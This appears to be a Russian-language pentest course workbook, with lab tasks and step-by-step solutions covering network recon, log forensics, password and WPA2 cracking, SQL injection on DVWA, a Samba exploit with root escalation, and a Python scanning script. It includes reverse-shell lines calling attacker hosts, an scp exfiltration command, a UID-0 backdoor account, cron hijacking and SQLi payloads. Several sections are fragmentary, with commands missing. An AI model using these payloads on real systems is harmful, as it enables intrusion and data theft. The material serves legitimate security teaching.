## ЗАДАНИЕ 1 (Неделя 1): Полная разведка локальной сети — найти все устройства, порты и сервисы

### Постановка задачи

Вы подключились к корпоративной сети (лабораторной). Ваша задача — обнаружить **все живые хосты** в подсети 192.168.56.0/24, определить **открытые порты**, **версии сервисов** и **операционные системы**. Составить карту сети.

**Время:** 60 минут
**Сложность:** ★★★☆☆

### Полное решение с объяснениями

#### Шаг 1. Определяем свой IP и подсеть

```bash
┌──(kali㉿kali)-[~]
└─$ ip addr show eth1
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    link/ether 08:00:27:a1:b2:c3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.1/24 brd 192.168.56.255 scope global eth1
       valid_lft forever preferred_lft forever
```

**Объяснение:** Мы на интерфейсе `eth1` с адресом `192.168.56.1`. Маска `/24` означает, что в подсети могут быть адреса от 192.168.56.1 до 192.168.56.254 (254 потенциальных хоста).

#### Шаг 2. Обнаруживаем живые хосты (Ping Sweep)

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sn 192.168.56.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 10:00 UTC
Nmap scan report for 192.168.56.1
Host is up (0.00010s latency).
MAC Address: 08:00:27:A1:B2:C3 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
MAC Address: 08:00:27:D4:E5:F6 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.102
Host is up (0.00038s latency).
MAC Address: 08:00:27:G7:H8:I9 (Oracle VirtualBox virtual NIC)

Nmap done: 256 IP addresses (3 hosts up) scanned in 2.03 seconds
```

**Объяснение:**
- Флаг `-sn` означает **Ping Scan** — Nmap отправляет ICMP Echo, TCP SYN на порт 443, TCP ACK на порт 80 и ICMP Timestamp. Он не сканирует порты — только проверяет, живой ли хост.
- Найдено 3 хоста: `.1` (мы сами), `.101` и `.102` — наши цели.
- MAC-адреса начинаются на `08:00:27` — это OUI (Organizationally Unique Identifier) компании Oracle/VirtualBox. В реальной сети по MAC-адресу можно определить производителя устройства.

**Объяснение:**
- `-sS` — **SYN Scan** (полускрытый). Nmap отправляет SYN-пакет. Если получает SYN-ACK — порт открыт, RST — закрыт. Nmap НЕ завершает TCP-рукопожатие (не отправляет финальный ACK), поэтому соединение не логируется в большинстве систем.
- `-p-` — сканировать **все 65535 портов**, а не только топ-1000.
- `--min-rate 5000` — отправлять минимум 5000 пакетов в секунду (ускорение).
- `-T4` — агрессивная скорость.
- `-oN` — сохранить результат в файл.

## ЗАДАНИЕ 2 (Неделя 2): Расследование взлома через анализ логов Linux

### Постановка задачи

На сервер поступили жалобы от пользователей о подозрительной активности. Системный администратор предоставил вам доступ. Проанализируйте системные логи и определите: **кто, когда и как** проник в систему. Напишите отчёт об инциденте.

**Время:** 90 минут
**Сложность:** ★★★★☆

### Полное решение с объяснениями

#### Шаг 1. Проверяем текущих пользователей и подозрительные аккаунты

```bash
┌──(kali㉿kali)-[~]
└─$ cat /etc/passwd | grep -v "nologin\|false" | grep "/bin"

root:x:0:0:root:/root:/bin/bash
user1:x:1000:1000:User One:/home/user1:/bin/bash
admin:x:1001:1001:Admin:/home/admin:/bin/bash
hacker:x:0:0::/tmp:/bin/bash
```

**Объяснение:** Мы фильтруем файл `/etc/passwd`, оставляя только пользователей с реальной оболочкой (`/bin/bash`). Сразу видим подозрительное:
- Пользователь `hacker` с **UID=0** (это root-привилегии!)
- Его домашняя директория — `/tmp` (нетипично)
- Он точно не был создан легитимно

```bash
┌──(kali㉿kali)-[~]
└─$ grep "hacker" /etc/passwd
hacker:x:0:0::/tmp:/bin/bash

┌──(kali㉿kali)-[~]
└─$ grep "hacker" /etc/group
root:x:0:hacker
```

**Вывод:** Злоумышленник создал пользователя `hacker` с root-правами (UID=0) и добавил его в группу `root`.

- В 03:42 создан бэкдор-аккаунт `hacker`.
- В 03:45 злоумышленник зашёл уже под `hacker`.

#### Шаг 4. Что злоумышленник делал в системе?

```bash
┌──(kali㉿kali)-[~]
└─$ cat /home/admin/.bash_history

ls
whoami
id
sudo su -
cat /etc/shadow
useradd -o -u 0 -g 0 -d /tmp -s /bin/bash hacker

chmod +x /tmp/.backdoor.sh

scp /tmp/data.tar.gz attacker@10.10.14.55:/loot/

```

**Полный разбор действий злоумышленника:**

| # | Команда | Что делает | Значение |
|---|---------|-----------|----------|
| 1 | `whoami`, `id` | Узнал, кто он | Разведка |
| 2 | `sudo su -` | Повысил привилегии до root | У `admin` было sudo |
| 3 | `cat /etc/shadow` | Прочитал хэши паролей | Сбор данных |
| 4 | `useradd -o -u 0...` | Создал root-аккаунт `hacker` | **Бэкдор #1 — пользователь** |
| 5 | `echo ... >> /etc/crontab` | Добавил задачу в cron | **Бэкдор #2 — cron** |
| 6 | `wget ... backdoor.sh` | Скачал скрипт со своего сервера | **Бэкдор #3 — скрипт** |
| 7 | `tar czf ... /etc/shadow /home/` | Упаковал конфиденциальные данные | **Кража данных** |
| 8 | `scp ... attacker@...` | Отправил данные на свой сервер | **Эксфильтрация** |
| 9 | `rm`, `history -c` | Удалил следы | Заметание следов |

#### Шаг 5. Проверяем бэкдоры

```bash
# Проверяем cron
┌──(kali㉿kali)-[~]
└─$ cat /etc/crontab | grep -v "^#"
* * * * * root /tmp/.backdoor.sh

# Проверяем скрипт
┌──(kali㉿kali)-[~]
└─$ cat /tmp/.backdoor.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.55/4444 0>&1

# Проверяем SUID-файлы (вдруг добавил ещё)
┌──(kali㉿kali)-[~]
└─$ find / -perm -4000 -newer /etc/hostname -type f 2>/dev/null
/tmp/.suid_shell
```

**Объяснение бэкдора:**
- `/tmp/.backdoor.sh` — это **reverse shell**. Каждую минуту (cron `* * * * *`) система подключается к IP злоумышленника на порт 4444, давая ему удалённую оболочку.
- `.` перед именем файла делает его скрытым (`ls` без `-a` не покажет).
- Ещё найден SUID-shell в `/tmp/.suid_shell` — ещё один бэкдор.

**Сложность:** ★★★★☆

### Полное решение с объяснениями

#### Подготовка — создаём файл с хэшами для тренировки

```bash
┌──(kali㉿kali)-[~]
└─$ cat > hashes.txt << 'EOF'
```

**Объяснение:** Это MD5-хэши (32 шестнадцатеричных символа). MD5 — устаревший алгоритм, но до сих пор встречается в старых системах.

#### Шаг 1. Определяем тип хэша

```bash

[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Или вручную: 32 символа, [0-9a-f] → почти наверняка **MD5**.

**Режимы хэшей в hashcat:**
- MD5 = `-m 0`
- SHA-1 = `-m 100`
- SHA-256 = `-m 1400`
- NTLM (Windows) = `-m 1000`
- bcrypt = `-m 3200`

#### Шаг 2. Простая словарная атака с John the Ripper


#### Шаг 3. Атака с правилами (Rules) для оставшихся хэшей

Правила (rules) мутируют слова из словаря: добавляют цифры, меняют регистр, заменяют буквы символами.

```bash
┌──(kali㉿kali)-[~]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt \
    --rules=best64 hashes.txt

Loaded 3 remaining password hashes
Using default input encoding: UTF-8

P@ssw0rd         (user5)

1g 0:00:00:15 DONE
```

**Объяснение:** Правило `best64` применяет 64 наиболее эффективные мутации к каждому слову:
- `password` → `Password`, `PASSWORD`, `password1`, `password!`, `p@ssword`, `drowssap` (реверс) и т.д.
- Пароль `P@ssw0rd` — мутация слова `password` с заменой `a→@` и `o→0`.

#### Шаг 4. Маска (Brute Force по шаблону) с hashcat

```bash

    10  08:00:27:11:22:33  192.168.1.50
```

**Обнаружено! ARP Spoofing:**
- IP-адрес `192.168.1.1` (шлюз) объявляется **двумя разными MAC-адресами**:
  - `08:00:27:aa:bb:cc` — настоящий MAC шлюза

- Атакующий (`dd:ee:ff`) также объявляет себя как `192.168.1.50` — он подменяет обе стороны (Man-in-the-Middle).


## ЗАДАНИЕ 6 (Неделя 6): Полная эксплуатация SQL-инъекции от обнаружения до извлечения данных

### Постановка задачи

На учебном веб-приложении DVWA (уровень безопасности — Low) найдите SQL-инъекцию, вручную определите структуру базы данных и извлеките все учётные данные пользователей. Затем повторите атаку с помощью SQLMap.

**Время:** 90 минут
**Сложность:** ★★★★★

### Полное решение с объяснениями

#### Подготовка: вход в DVWA

```
URL: http://192.168.56.102/dvwa/
Логин: admin
Пароль: password
Настройки → Security Level → Low
```

#### Шаг 1. Обнаружение уязвимости

Переходим: `DVWA → SQL Injection`

Видим поле ввода: "User ID". Вводим `1`:

```
URL: http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

Результат:
ID: 1
First name: admin
Surname: admin
```

Теперь проверяем на инъекцию — вводим `1'`:

```
URL: ...?id=1'&Submit=Submit

Результат:
You have an error in your SQL syntax; check the manual that
corresponds to your MySQL server version for the right syntax
to use near ''1''' at line 1
```

**Анализ:** Ошибка SQL-синтаксиса! Наша кавычка сломала запрос. Это доказывает, что ввод подставляется в SQL-запрос без экранирования.

Оригинальный запрос на сервере (предположение):
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

Когда мы вводим `1'`, запрос становится:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1''
```
Лишняя кавычка → синтаксическая ошибка.

#### Шаг 2. Определяем количество столбцов (ORDER BY)

Нам нужно знать, сколько столбцов возвращает запрос, чтобы использовать UNION.

```
Ввод: 1' ORDER BY 1-- -
Результат: OK (данные отображаются)

Ввод: 1' ORDER BY 2-- -
Результат: OK

Ввод: 1' ORDER BY 3-- -
Результат: Error! "Unknown column '3' in 'order clause'"
```

**Объяснение:** `ORDER BY N` сортирует результат по N-му столбцу. Если столбца нет — ошибка. Столбец 2 работает, 3 — нет. Значит запрос возвращает **2 столбца**.

`-- -` — это комментарий в SQL (всё после него игнорируется). Пробел и дефис после `--` нужны для корректной работы в MySQL.

#### Шаг 3. Определяем, какие столбцы отображаются

```
Ввод: 1' UNION SELECT 'test1','test2'-- -

Результат:
ID: 1' UNION SELECT 'test1','test2'-- -
First name: admin
Surname: admin

ID: 1' UNION SELECT 'test1','test2'-- -
First name: test1
Surname: test2
```

**Объяснение:** UNION объединяет результаты двух запросов. Мы видим, что `test1` попал в поле "First name", а `test2` — в "Surname". Оба столбца отображаются — отлично, можем извлекать данные через любой из них.

#### Шаг 4. Узнаём версию MySQL и текущую базу

```
Ввод: 1' UNION SELECT version(), database()-- -

Результат:
First name: 5.7.33-0ubuntu0.18.04.1
Surname: dvwa
```

**Узнали:**
- MySQL версия: 5.7.33
- Текущая база данных: `dvwa`

#### Шаг 5. Перечисляем все таблицы в базе dvwa

```
Ввод: 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'-- -

Результат:

Surname: dvwa
```

**Объяснение:** `information_schema` — служебная база данных MySQL, содержащая метаданные обо всех базах, таблицах и столбцах. Мы запрашиваем таблицу `tables`, фильтруя по нашей базе `dvwa`.

## ЗАДАНИЕ 7 (Неделя 7): Эксплуатация Samba и повышение привилегий до root

### Постановка задачи

Через Metasploit проэксплуатируйте уязвимость Samba (CVE-2007-2447) на Metasploitable 2, получите начальный доступ, затем повысьте привилегии до root двумя разными способами.

**Время:** 60 минут
**Сложность:** ★★★★★

### Полное решение с объяснениями

#### Шаг 1. Находим уязвимый Samba

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 139,445 192.168.56.101

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

Samba 3.0.20 — уязвима к **CVE-2007-2447** (username map script command execution). Уязвимость позволяет выполнить произвольный код, внедрив shell-метасимволы в имя пользователя при подключении.

#### Шаг 2. Эксплуатация через Metasploit

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q

msf6 > search samba usermap

Matching Modules

   0  exploit/multi/samba/usermap_script   2007-05-14       excellent  Samba "username map script" Command Execution

msf6 > use exploit/multi/samba/usermap_script
```

**Объяснение:** Модуль `usermap_script` эксплуатирует ошибку в опции `username map script` Samba 3.0.20-3.0.25rc3. Когда эта опция активна, символы в имени пользователя передаются в `/bin/sh` без фильтрации — можно внедрить команду.

**Результат:** Мы сразу получили **root shell**! В данном случае Samba работала от root, поэтому повышение привилегий не потребовалось. Но давайте представим, что мы получили доступ как обычный пользователь, и рассмотрим два способа повышения привилегий.

#### Шаг 3. Повышение привилегий — Способ 1: SUID

Допустим, мы имеем shell как `www-data` (обычный пользователь):

```bash
www-data@metasploitable:/$ find / -perm -4000 -type f 2>/dev/null

/usr/bin/nmap
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/sbin/pppd
/bin/ping
/bin/su
/bin/mount
/bin/umount
```

**Обнаружено:** `/usr/bin/nmap` имеет SUID-бит! Nmap версии 2.02-5.21 имеет интерактивный режим, позволяющий выполнять команды:

```bash
www-data@metasploitable:/$ /usr/bin/nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h for help

nmap> !sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**Объяснение:**
1. `nmap --interactive` запускает интерактивный режим Nmap.
2. `!sh` выполняет команду shell из Nmap.
3. Поскольку Nmap имеет SUID-бит и принадлежит root, shell запускается с привилегиями root.
4. Этот метод задокументирован на **GTFOBins** (https://gtfobins.github.io/gtfobins/nmap/).

#### Шаг 4. Повышение привилегий — Способ 2: Cron

```bash
www-data@metasploitable:/$ cat /etc/crontab

# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 * * * * root /opt/scripts/cleanup.sh
```

```bash
www-data@metasploitable:/$ ls -la /opt/scripts/cleanup.sh
-rwxrwxrwx 1 root root 45 Jan 10 10:00 /opt/scripts/cleanup.sh
```

**Обнаружено:** Скрипт `/opt/scripts/cleanup.sh` запускается каждые 5 минут **от root**, и при этом доступен для записи **всем** (`rwxrwxrwx`)!

```bash
# Запускаем слушатель на Kali:
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...

# На Metasploitable заменяем скрипт reverse shell:
www-data@metasploitable:/$ echo '#!/bin/bash' > /opt/scripts/cleanup.sh
www-data@metasploitable:/$ echo 'bash -i >& /dev/tcp/192.168.56.1/5555 0>&1' >> /opt/scripts/cleanup.sh

# Ждём до 5 минут... и на Kali:
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.56.1] from 192.168.56.101
root@metasploitable:/# whoami
root
```

**Объяснение:**
1. Cron запускает скрипт от root каждые 5 минут.
2. Скрипт доступен для записи всем — грубая ошибка конфигурации.
3. Мы заменили содержимое скрипта на reverse shell.
4. Когда cron выполнил скрипт — мы получили root shell.

### Выводы

1. CVE-2007-2447 — пример критической уязвимости с удалённым выполнением кода.
2. SUID-файлы — один из первых векторов проверки при повышении привилегий.
3. Неправильные права на cron-скрипты — частая ошибка, ведущая к полной компрометации.
4. Всегда проверяйте: SUID (`find / -perm -4000`), sudo (`sudo -l`), cron (`cat /etc/crontab`), права на файлы.

### Полное решение с объяснениями

#### Шаг 1. Переводим адаптер в режим мониторинга

```bash
10:15:01  Sending 64 directed DeAuth (code 7). STMAC: [DD:DD:DD:11:22:33]
10:15:02  Sending 64 directed DeAuth (code 7). STMAC: [DD:DD:DD:11:22:33]
```

**Объяснение:**
- Деаутентификация отключает клиента от точки доступа, отправляя поддельные deauth-кадры.
- Клиент автоматически переподключается — и в процессе отправляет **4-way handshake**.
- airodump-ng захватывает этот handshake.

В окне airodump-ng должно появиться:

```
 CH  6 ][ Elapsed: 45 s ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

Надпись `WPA handshake:` — handshake захвачен!

```bash
      Time left: 33 minutes, 12 seconds                    1.63%

Master Key     : A1 B2 C3 D4 E5 F6 ... (64 hex chars)
Transient Key  : 11 22 33 44 55 66 ... (256 hex chars)
EAPOL HMAC     : AA BB CC DD EE FF ... (32 hex chars)
```

**Пароль найден: `Sunshine2024`**

**Объяснение:** aircrack-ng берёт каждое слово из словаря, комбинирует его с SSID сети и вычисляет PMK (Pairwise Master Key) через PBKDF2-SHA1 (4096 итераций). Затем сравнивает с захваченным handshake. При совпадении — пароль найден.

### Выводы

1. WPA2-PSK уязвим к словарным атакам, если пароль слабый.
2. Handshake можно захватить, спровоцировав переподключение клиента (deauth).
3. Для защиты: используйте длинные, случайные пароли (16+ символов), или WPA3.
4. Скорость перебора WPA2 сильно ограничена из-за PBKDF2 (в отличие от MD5, где миллиарды хэшей в секунду, здесь — тысячи).

Напишите Python-скрипт, который автоматизирует начальную фазу пентеста: обнаружение хостов, сканирование портов, определение сервисов и генерацию отчёта.

**Время:** 90 минут
**Сложность:** ★★★★★

### Полное решение

```python
#!/usr/bin/env python3
"""
AutoRecon — автоматизированная разведка для пентеста.
Только для авторизованного тестирования!
"""

import subprocess
import socket
import ipaddress
import sys
import os
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


def banner():
    print("""
    ╔═══════════════════════════════════════╗
    ║          AutoRecon v1.0               ║
    ║   Автоматизированная разведка сети    ║
    ║                                       ║
    ║  ⚠ Только для авторизованного теста!  ║
    ╚═══════════════════════════════════════╝
    """)


def ping_host(ip):
    """Проверяет доступность хоста через ICMP ping."""
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", str(ip)],
            capture_output=True,
            text=True,
            timeout=3
        )
        return result.returncode == 0
    except (subprocess.TimeoutExpired, Exception):
        return False


def discover_hosts(network):
    """Обнаруживает живые хосты в подсети через ping sweep."""
    print(f"\n[*] Обнаружение хостов в {network}...")
    live_hosts = []
    net = ipaddress.ip_network(network, strict=False)
    hosts = list(net.hosts())
    total = len(hosts)

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(ping_host, ip): ip for ip in hosts}
        done = 0
        for future in as_completed(futures):
            done += 1
            ip = futures[future]
            if future.result():
                live_hosts.append(str(ip))
                print(f"    [+] {ip} — ЖИВОЙ")
            if done % 50 == 0:
                print(f"    ... проверено {done}/{total}")

    print(f"\n[*] Найдено живых хостов: {len(live_hosts)}")
    return live_hosts


def scan_port(ip, port):
    """Проверяет, открыт ли TCP-порт."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port if result == 0 else None
    except Exception:
        return None


def scan_ports(ip, ports=None):
    """Сканирует TCP-порты хоста."""
    if ports is None:
        ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
            143, 443, 445, 993, 995, 1433, 1521, 2049,
            3306, 3389, 5432, 5900, 5985, 6379, 8000,
            8080, 8443, 8888, 9090, 27017
        ]

    print(f"\n[*] Сканирование портов {ip} ({len(ports)} портов)...")
    open_ports = []

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, ip, p): p for p in ports}
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)

    open_ports.sort()
    for port in open_ports:
        print(f"    [+] {port}/tcp — ОТКРЫТ")

    return open_ports


def grab_banner(ip, port):
    """Получает баннер сервиса."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        if port == 80 or port == 8080:
            sock.send(b"HEAD / HTTP/1.1\r\nHost: " +
                       ip.encode() + b"\r\n\r\n")
        elif port == 21:
            pass  # FTP отправляет баннер сам
        else:
            sock.send(b"\r\n")

        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner[:200]  # Обрезаем до 200 символов
    except Exception:
        return "Баннер недоступен"


def identify_service(port, banner):
    """Определяет сервис по порту и баннеру."""
    known_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPC",
        135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 2049: "NFS",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
        5900: "VNC", 5985: "WinRM", 6379: "Redis",
        8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
        27017: "MongoDB"
    }

    service = known_ports.get(port, "Unknown")

    # Уточняем по баннеру
    banner_lower = banner.lower()
    if "openssh" in banner_lower:
        service = "SSH (OpenSSH)"
    elif "apache" in banner_lower:
        service = "HTTP (Apache)"
    elif "nginx" in banner_lower:
        service = "HTTP (Nginx)"
    elif "vsftpd" in banner_lower:
        service = "FTP (vsFTPd)"
    elif "mysql" in banner_lower:
        service = "MySQL"
    elif "samba" in banner_lower:
        service = "SMB (Samba)"

    return service


def check_vulnerabilities(service, banner):
    """Проверяет известные уязвимости по версии сервиса."""
    vulns = []

    if "vsftpd 2.3.4" in banner.lower():
        vulns.append("CVE-2011-2523: vsftpd 2.3.4 бэкдор (Критический)")

    if "apache/2.2" in banner.lower():
        vulns.append("Устаревший Apache 2.2.x — множество CVE")

    if "samba 3.0" in banner.lower():
        vulns.append("CVE-2007-2447: Samba usermap_script RCE (Критический)")

    if "openssh" in banner.lower():
        parts = banner.split()
        for part in parts:
            if part.lower().startswith("openssh"):
                try:
                    version = part.split("_")[1].split("p")[0]
                    major, minor = version.split(".")
                    if int(major) < 8:
                        vulns.append(f"Устаревший OpenSSH {version}")
                except (IndexError, ValueError):
                    pass

    if service == "Telnet":
        vulns.append("Telnet передаёт данные открытым текстом!")

    if service == "FTP" and "anonymous" in banner.lower():
        vulns.append("Анонимный FTP-доступ разрешён")

    return vulns


def generate_report(results, output_file="recon_report.md"):
    """Генерирует Markdown-отчёт."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    report = f"""# Отчёт автоматической разведки
**Дата:** {now}
**Инструмент:** AutoRecon v1.0

---

## Обнаруженные хосты: {len(results)}

"""
    total_vulns = 0

    for host_data in results:
        ip = host_data["ip"]
        ports = host_data["ports"]

        report += f"### {ip}\n\n"
        report += "| Порт | Сервис | Баннер | Уязвимости |\n"
        report += "|------|--------|--------|------------|\n"

        for port_data in ports:
            vuln_text = "; ".join(port_data["vulns"]) if port_data["vulns"] else "—"
            total_vulns += len(port_data["vulns"])
            banner_short = port_data["banner"][:50].replace("|", "\\|")
            report += (
                f"| {port_data['port']}/tcp | {port_data['service']} "
                f"| {banner_short} | {vuln_text} |\n"
            )

        report += "\n"

    report += f"""---

## Статистика

- Хостов просканировано: {len(results)}
- Всего открытых портов: {sum(len(h['ports']) for h in results)}
- Потенциальных уязвимостей: {total_vulns}

## Рекомендации

1. Обновить все устаревшие сервисы
2. Закрыть ненужные порты файрволом
3. Заменить Telnet и FTP на SSH/SFTP
4. Провести детальное сканирование уязвимостей (Nmap NSE, Nessus)
"""

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(report)

    print(f"\n[*] Отчёт сохранён: {output_file}")
    return report


def main():
    banner()

    if len(sys.argv) < 2:
        print("Использование: python3 autorecon.py <цель>")
        print("Примеры:")
        print("  python3 autorecon.py 192.168.56.0/24    # Подсеть")
        print("  python3 autorecon.py 192.168.56.101      # Один хост")
        sys.exit(1)

    target = sys.argv[1]
    results = []

    # Определяем — это подсеть или один хост?
    try:
        net = ipaddress.ip_network(target, strict=False)
        if net.num_addresses > 1:
            live_hosts = discover_hosts(target)
        else:
            live_hosts = [target.split("/")[0]]
            print(f"\n[*] Цель: {live_hosts[0]}")
    except ValueError:
        live_hosts = [target]
        print(f"\n[*] Цель: {target}")

    # Сканируем каждый живой хост
    for ip in live_hosts:
        open_ports = scan_ports(ip)

        if not open_ports:
            print(f"    [-] {ip}: открытых портов не найдено")
            continue

        host_data = {"ip": ip, "ports": []}

        print(f"\n[*] Получение баннеров {ip}...")
        for port in open_ports:
            banner = grab_banner(ip, port)
            service = identify_service(port, banner)
            vulns = check_vulnerabilities(service, banner)

            port_data = {
                "port": port,
                "service": service,
                "banner": banner,
                "vulns": vulns
            }
            host_data["ports"].append(port_data)

            vuln_mark = " ⚠️" if vulns else ""
            print(f"    {port}/tcp — {service}{vuln_mark}")

            for v in vulns:
                print(f"        ⚠ {v}")

        results.append(host_data)

    # Генерируем отчёт
    if results:
        generate_report(results)
        # Сохраняем также в JSON для дальнейшей обработки
        with open("recon_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"[*] JSON-данные: recon_results.json")

    print("\n[*] Разведка завершена!")


if __name__ == "__main__":
    main()
```
